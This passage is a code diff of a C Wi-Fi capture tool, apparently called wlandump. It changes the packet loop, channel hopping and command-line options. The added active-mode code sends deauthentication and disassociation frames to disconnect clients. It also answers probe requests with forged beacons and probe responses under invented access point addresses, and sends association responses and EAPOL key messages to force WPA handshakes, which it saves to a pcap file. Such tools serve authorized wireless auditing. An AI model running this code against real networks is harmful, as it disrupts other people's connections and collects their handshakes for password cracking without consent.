+	pcap_breakloop(pcapin);
+	alarm(5);
 	}
 return;
 }
 /*===========================================================================*/
-void setchannel(char *interfacename, uint8_t channel)
+void programmende(int signum)
+{
+if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
+	{
+	pcap_dump_flush(pcapout);
+	pcap_dump_close(pcapout);
+	pcap_close(pcapin);
+	printf("\nprogram terminated...\n");
+	exit (EXIT_SUCCESS);
+	}
+return;
+}
+/*===========================================================================*/
+void setchannel()
 {
 struct iwreq wrq;
 
@@ -1012,7 +694,7 @@ memset(&wrq, 0, sizeof(struct iwreq));
 strncpy(wrq.ifr_name, interfacename , IFNAMSIZ);
 if((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
 	{
-        fprintf(stderr, "Socket open for ioctl() on '%s' failed with '%d'\n", interfacename, sock);
+        fprintf(stderr, "socket open for ioctl() on '%s' failed with '%d'\n", interfacename, sock);
 	programmende(SIGINT);
 	}
 
@@ -1033,7 +715,7 @@ close(sock);
 return;
 }
 /*===========================================================================*/
-void pcaploop(char *interfacename, int has_rth, uint8_t channel)
+void pcaploop(int has_rth, int staytime)
 {
 const uint8_t *packet = NULL;
 const uint8_t *h80211 = NULL;
@@ -1042,15 +724,37 @@ rth_t *rth = NULL;
 mac_t *macf = NULL;
 eap_t *eap = NULL;
 essid_t *essidf;
-macl_t *zeiger = NULL;
-authf_t *authenticationreq = NULL;
 uint8_t	*payload = NULL;
 int pcapstatus = 1;
 int macl = 0;
 int fcsl = 0;
+int staytimecount = staytime;
 uint8_t field = 0;
-int resttimecount = resttime;
+
+
+#ifdef DOACTIVE
+ uint8_t mkey = 0;
+ authf_t *authenticationreq = NULL;
+
+#else
+  #ifdef DOSTATUS
+	uint8_t mkey = 0;
+	authf_t *authenticationreq = NULL;
+  #endif
+#endif
+
+#ifdef DOACTIVE
+apl_t *zeiger;
 int c;
+#endif
+
+#ifdef DOSTATUS
+unsigned long long int replaycount;
+#endif
+
+#ifdef DOSTATUS
+char essidstr[34];
+#endif
 
 while(1)
 	{
@@ -1060,46 +764,33 @@ while(1)
 
 	if(pcapstatus == -1)
 		{
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 		system("reboot");
 #endif
+
+		fprintf(stderr, "pcap read error: %s \n", pcap_geterr(pcapin));
 		continue;
 		}
 
 	if(pcapstatus == -2)
 		{
 		pcap_dump_flush(pcapout);
-#ifdef RASPBERRY
-		digitalWrite(0, HIGH);
-		delay (25);
-		digitalWrite(0, LOW);
-		delay (25);
-		if(digitalRead(7) == 1)
-			{
-			digitalWrite(0, HIGH);
-			pcap_dump_close(pcapout);
-			pcap_close(pcapin);
-			system("poweroff");
-			}
-#endif
-		if(resttimecount == 0)
+		if(staytimecount == 0)
 			{
 			channel++;
 			if(channel > 13)
-				channel = 1;
-			setchannel(interfacename, channel);
-			zeiger = netlist;
-			for(c = 0; c < MACLISTESIZEMAX; c++)
 				{
-				zeiger->deauthcount = 0;
-				zeiger->disassoccount = 0;
-				zeiger->disassochs2count = 0;
-				zeiger->disassochs4count = 0;
-				zeiger++;
+				channel = 1;
+#ifdef DOACTIVE
+				for(c = 0; c < STALISTESIZEMAX; c++)
+					staliste->deauthcount = deauthmax;
+#endif
 				}
-			resttimecount = resttime;
+
+			setchannel(interfacename, channel);
+			staytimecount = staytime;
 			}
-		resttimecount--;
+		staytimecount--;
 		continue;
 		}
 
@@ -1159,22 +850,25 @@ while(1)
 			if(essidf->info_essid_len > 32)
 				continue;
 			if(essidf->info_essid_len == 0)
-				{
-				if(handlehiddenessid(macf->addr1.addr, macf->addr2.addr) == NEWENTRY)
-					pcap_dump((u_char *) pcapout, pkh, h80211);
 				continue;
-				}
 			if(&essidf->essid[0] == 0)
-				{
-				if(handlehiddenessid(macf->addr1.addr, macf->addr2.addr) == NEWENTRY)
-					pcap_dump((u_char *) pcapout, pkh, h80211);
 				continue;
-				}
-
-			if(handlebeacon(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == NEWENTRY)
+			if(handleapframes(macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
+				{
+#ifdef DOACTIVE
+				senddeauth(MAC_ST_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, macf->addr1.addr, macf->addr2.addr);
+#endif
 				pcap_dump((u_char *) pcapout, pkh, h80211);
+#ifdef DOSTATUS
+				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
+				memset(&essidstr, 0, 34);
+				memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
+				printf("%s (beacon)\n", essidstr);
+#endif
+				}
 			continue;
 			}
+
 		else if(macf->subtype == MAC_ST_PROBE_RESP)
 			{
 			essidf = (essid_t*)(payload +BEACONINFO_SIZE);
@@ -1186,8 +880,17 @@ while(1)
 				continue;
 			if (&essidf->essid[0] == 0)
 				continue;
-			if(handleproberesponse(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == NEWENTRY)
+
+			if(handleapframes(macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
+				{
 				pcap_dump((u_char *) pcapout, pkh, h80211);
+#ifdef DOSTATUS
+				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
+				memset(&essidstr, 0, 34);
+				memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
+				printf("%s (proberesponse)\n", essidstr);
+#endif
+				}
 			continue;
 			}
 
@@ -1203,19 +906,62 @@ while(1)
 				continue;
 			if (&essidf->essid[0] == 0)
 				continue;
-			if(memcmp(macf->addr1.addr, &broadcast, 6) == 0)
-				{
-				if(handleproberequest(channel, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == NEWENTRY)
-					{
-					pcap_dump((u_char *) pcapout, pkh, h80211);
-					}
-				continue;
-				}
 
-			else if(handledirectproberequest(channel, macf->addr2.addr, macf->addr1.addr, essidf->info_essid_len, essidf->essid) == NEWENTRY)
+#ifdef DOACTIVE
+			if(memcmp(&broadcast, macf->addr1.addr, 6) != 0)
+				{
+				sendproberesponse(channel, macf->addr2.addr, macf->addr1.addr, essidf->info_essid_len, essidf->essid);
+				sendbeacon(channel, macf->addr1.addr, essidf->info_essid_len, essidf->essid);
+				}
+			else
+				{
+				zeiger = apliste;
+				for(c = 0; c < APLISTESIZEMAX; c++)
+					{
+					if((zeiger->essid_len == essidf->info_essid_len) && (memcmp(zeiger->essid, essidf->essid, essidf->info_essid_len) == 0))
+						{
+						sendproberesponse(channel, macf->addr2.addr, zeiger->addr_ap.addr, essidf->info_essid_len, essidf->essid);
+						sendbeacon(channel, zeiger->addr_ap.addr, essidf->info_essid_len, essidf->essid);
+						break;
+						}
+
+					if(memcmp(&mac_null, zeiger->addr_ap.addr, 6) == 0)
+						{
+						myaddr.addr[5] = myap & 0xff;
+						myaddr.addr[4] = (myap >> 8) & 0xff;
+						myaddr.addr[3] = (myap >> 16) & 0xff;
+						myap++;
+						sendproberesponse(channel, macf->addr2.addr, myaddr.addr, essidf->info_essid_len, essidf->essid);
+						sendbeacon(channel, myaddr.addr, essidf->info_essid_len, essidf->essid);
+						break;
+						}
+					zeiger++;
+					}
+
+				if(c >= APLISTESIZEMAX)
+					{
+					myaddr.addr[5] = myap & 0xff;
+					myaddr.addr[4] = (myap >> 8) & 0xff;
+					myaddr.addr[3] = (myap >> 16) & 0xff;
+					myap++;
+					sendproberesponse(channel, macf->addr2.addr, myaddr.addr, essidf->info_essid_len, essidf->essid);
+					sendbeacon(channel, myaddr.addr, essidf->info_essid_len, essidf->essid);
+					}
+				}
+#endif
+			if(handlestaframes(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
+				{
 				pcap_dump((u_char *) pcapout, pkh, h80211);
+#ifdef DOSTATUS
+				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
+				memset(&essidstr, 0, 34);
+				memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
+				printf("%s (proberequest)\n", essidstr);
+#endif
+				}
 			continue;
 			}
+
 
 		/* check associationrequest - reassociationrequest frames */
 		else if(macf->subtype == MAC_ST_ASSOC_REQ)
@@ -1229,9 +975,20 @@ while(1)
 				continue;
 			if (&essidf->essid[0] == 0)
 				continue;
-			if(handleassociationrequest(macf->addr2.addr, macf->addr1.addr, essidf->info_essid_len, essidf->essid) == NEWENTRY)
-				pcap_dump((u_char *) pcapout, pkh, h80211);
+#ifdef DOACTIVE
+			sendacknowledgement(macf->addr2.addr);
+			sendassociationresponse(MAC_ST_ASSOC_RESP, macf->addr2.addr, macf->addr1.addr);
 			sendkey1(macf->addr2.addr, macf->addr1.addr);
+#endif
+			if(handlestaframes(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
+				pcap_dump((u_char *) pcapout, pkh, h80211);
+
+#ifdef DOSTATUS
+			printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
+			memset(&essidstr, 0, 34);
+			memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
+			printf("%s (associationrequest)\n", essidstr);
+#endif
 			continue;
 			}
 
@@ -1246,30 +1003,71 @@ while(1)
 				continue;
 			if (&essidf->essid[0] == 0)
 				continue;
-			if(handlereassociationrequest(macf->addr2.addr, macf->addr1.addr, essidf->info_essid_len, essidf->essid) == NEWENTRY)
-				pcap_dump((u_char *) pcapout, pkh, h80211);
+#ifdef DOACTIVE
+			sendacknowledgement(macf->addr2.addr);
+			sendassociationresponse(MAC_ST_REASSOC_RESP, macf->addr2.addr, macf->addr1.addr);
 			sendkey1(macf->addr2.addr, macf->addr1.addr);
+#endif
+			if(handlestaframes(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
+				pcap_dump((u_char *) pcapout, pkh, h80211);
+
+
+#ifdef DOSTATUS
+			printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
+			memset(&essidstr, 0, 34);
+			memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
+			printf("%s (reassociationrequest)\n", essidstr);
+#endif
 			continue;
 			}
 
 		else if(macf->subtype == MAC_ST_AUTH)
 			{
+#ifdef DOACTIVE
 			authenticationreq = (authf_t*)(payload);
 			if(authenticationreq->authentication_seq == 1)
 				{
 				sendacknowledgement(macf->addr2.addr);
 				sendauthentication(macf->addr2.addr, macf->addr1.addr);
 				}
+#endif
+
+#ifdef DOSTATUS
+			if(authenticationreq->authentication_seq == 1)
+				{
+				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
+				printf("(authenticationrequest)\n");
+				}
+			else
+				{
+				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
+				printf("(authenticationresponse)\n");
+				}
+#endif
+			continue;
 			}
 		continue;
 		}
 
-
 	/* powersave */
 	if((macf->type == MAC_TYPE_DATA) && ((macf->subtype == MAC_ST_NULL)|| (macf->subtype == MAC_ST_QOSNULL)))
 		{
+#ifdef DOACTIVE
 		if((macf->to_ds == 1) && (macf->power == 0))
-			handlenullpowersave(macf->addr1.addr, macf->addr2.addr);
+			{
+			for(c = 0; c < STALISTESIZEMAX; c++)
+				{
+				if(memcmp(staliste->addr_sta.addr, macf->addr2.addr, 6) == 0)
+					{
+					if(staliste->deauthcount > 0)
+						{
+						senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY, macf->addr1.addr, macf->addr2.addr);
+						staliste->deauthcount -= 1;
+						}
+					}
+				}
+			}
+#endif
 		continue;
 		}
 
@@ -1279,27 +1077,72 @@ while(1)
 		{
 		eap = (eap_t*)(payload + LLC_SIZE);
 
+		if(eap->type == 3)
+			{
+#ifdef DOACTIVE
+			mkey = geteapkey(eap);
+			if(mkey == 4)
+				senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_AP_BUSY, macf->addr2.addr, macf->addr1.addr);
+#endif
+
+			pcap_dump((u_char *) pcapout, pkh, h80211);
+
+#ifdef DOSTATUS
+			replaycount = getreplaycount(eap);
+			if(mkey == 1)
+				{
+				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
+				printf("M1 message (replaycount: %lld)\n", replaycount);
+				}
+
+			if(mkey == 2)
+				{
+				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
+				if(replaycount == MYREPLAYCOUNT)
+					printf("\x1B[32mM2 message (replaycount: %lld wlandump forced handshake)\x1B[0m\n", replaycount);
+				else
+					printf("M2 message (replaycount: %lld)\n", replaycount);
+				}
+
+			if(mkey == 3)
+				{
+				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
+				printf("M3 message (replaycount: %lld)\n", replaycount);
+				}
+
+			if(mkey == 4)
+				{
+				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
+				printf("M4 message (replaycount: %lld)\n", replaycount);
+				}
+#endif
+			continue;
+			}
+
 		if(eap->type == 0)
 			{
 			pcap_dump((u_char *) pcapout, pkh, h80211);
-			}
+#ifdef DOSTATUS
+			if(macf->from_ds == 1) /* sta - ap */
+				{
+				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
+				printf("wps extended data\n");
+				}
 
-		if(eap->type == 1)
-			{
-			pcap_dump((u_char *) pcapout, pkh, h80211);
-			}
-
-		if(eap->type == 3)
-			{
-			pcap_dump((u_char *) pcapout, pkh, h80211);
-			handlehandshake(macf->addr1.addr, macf->addr2.addr, eap);
+			if(macf->to_ds == 1) /* ap - sta */
+				{
+				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
+				printf("wps extended data\n");
+				}
+#endif
+			continue;
 			}
 		}
 	}
 return;
 }
 /*===========================================================================*/
-int startcapturing(char *interfacename, char *pcapoutname, uint8_t channel)
+int startcapturing(char *pcapoutname, int staytime)
 {
 struct stat statinfo;
 struct bpf_program filter;
@@ -1308,7 +1151,7 @@ int filecount = 1;
 int datalink = 0;
 int pcapstatus;
 int has_rth = FALSE;
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 int c;
 #endif
 
@@ -1358,6 +1201,13 @@ if(pcapstatus != 0)
 	exit(EXIT_FAILURE);
 	}
 
+pcapstatus = pcap_set_rfmon(pcapin, 1);
+if(pcapstatus != 0)
+	{
+	fprintf(stderr, "error setting rfmon mode\n");
+	exit(EXIT_FAILURE);
+	}
+
 pcapstatus = pcap_activate(pcapin);
 if(pcapstatus != 0)
 	{
@@ -1397,10 +1247,13 @@ if ((pcapout = pcap_dump_open(pcapdh, newpcapoutname)) == NULL)
 	exit(EXIT_FAILURE);
 	}
 
+setchannel();
+#ifdef DOSTATUS
+		printf("%02d interface set to channel\n", channel);
+#endif
 
-setchannel(interfacename, channel);
 
-#ifdef RASPBERRY
+#ifdef DOGPIOSUPPORT
 if(wiringPiSetup() == -1)
 	{
 	puts ("wiringPi failed!");
@@ -1423,7 +1276,7 @@ signal(SIGINT, programmende);
 signal(SIGALRM, sigalarm);
 alarm(5);
 
-pcaploop(interfacename, has_rth, channel);
+pcaploop(has_rth, staytime);
 
 pcap_dump_flush(pcapout);
 pcap_dump_close(pcapout);
@@ -1453,7 +1306,6 @@ printf("%s %s (C) %s ZeroBeat\n"
 	"-d <number>    : send up to x deauthentication/disassociation packets per channel\n"
 	"               : default = up to 2 deauthentication/disassociation packets\n"
 	"-V <digit>     : accesspoint vendor xxxxxx\n"
-	"-S             : shows accesspoints if program terminates\n"
 	"-h             : help screen\n"
 	"-v             : version\n"
 	"\n", eigenname, VERSION, VERSION_JAHR, eigenname);
@@ -1471,9 +1323,8 @@ int main(int argc, char *argv[])
 {
 pcap_if_t *alldevs, *d;
 int auswahl;
-uint8_t channel = 1;
+int staytime = 1;
 char *eigenpfadname, *eigenname;
-char *devicename = NULL;
 char *pcapoutname = NULL;
 
 char pcaperrorstring[PCAP_ERRBUF_SIZE];
@@ -1484,13 +1335,13 @@ eigenname = basename(eigenpfadname);
 
 setbuf(stdout, NULL);
 srand(time(NULL));
-while ((auswahl = getopt(argc, argv, "i:o:c:t:d:V:Shv")) != -1)
+while ((auswahl = getopt(argc, argv, "i:o:c:t:d:hv")) != -1)
 	{
 	switch (auswahl)
 		{
 		case 'i':
-		devicename = optarg;
-		if(devicename == NULL)
+		interfacename = optarg;
+		if(interfacename == NULL)
 			{
 			fprintf(stderr, "no interface specified\n");
 			exit (EXIT_FAILURE);
@@ -1511,11 +1362,11 @@ while ((auswahl = getopt(argc, argv, "i:o:c:t:d:V:Shv")) != -1)
 		break;
 
 		case 't':
-		resttime = strtol(optarg, NULL, 10);
-		if(resttime < 1)
+		staytime = strtol(optarg, NULL, 10);
+		if(staytime < 1)
 			{
-			fprintf(stderr, "wrong hoptime\nsetting hoptime to 5 seconds\n");
-			resttime = 5;
+			fprintf(stderr, "wrong hoptime\nsetting hoptime to 1 ( 1 = 5 seconds\n");
+			staytime = 5;
 			}
 		break;
 
@@ -1525,10 +1376,6 @@ while ((auswahl = getopt(argc, argv, "i:o:c:t:d:V:Shv")) != -1)
 
 		case 'V':
 			sscanf(optarg, "%06x", &myoui);
-		break;
-
-		case 'S':
-		verbose = TRUE;
 		break;
 
 		case 'h':
@@ -1551,7 +1398,7 @@ if( getuid() != 0 )
 	exit(EXIT_FAILURE);
 	}
 
-if(devicename == NULL)
+if(interfacename == NULL)
 	{
 	fprintf(stdout,"\nno device selected - suitable devices:\n--------------------------------------\n");
 
@@ -1581,7 +1428,7 @@ if(initgloballists() != TRUE)
 	exit (EXIT_FAILURE);
 	}
 
-if(startcapturing(devicename, pcapoutname, channel) == FALSE)
+if(startcapturing(pcapoutname, staytime) == FALSE)
 	{
 	fprintf(stderr, "could not init devices or outputfile\n" );
 	exit (EXIT_FAILURE);
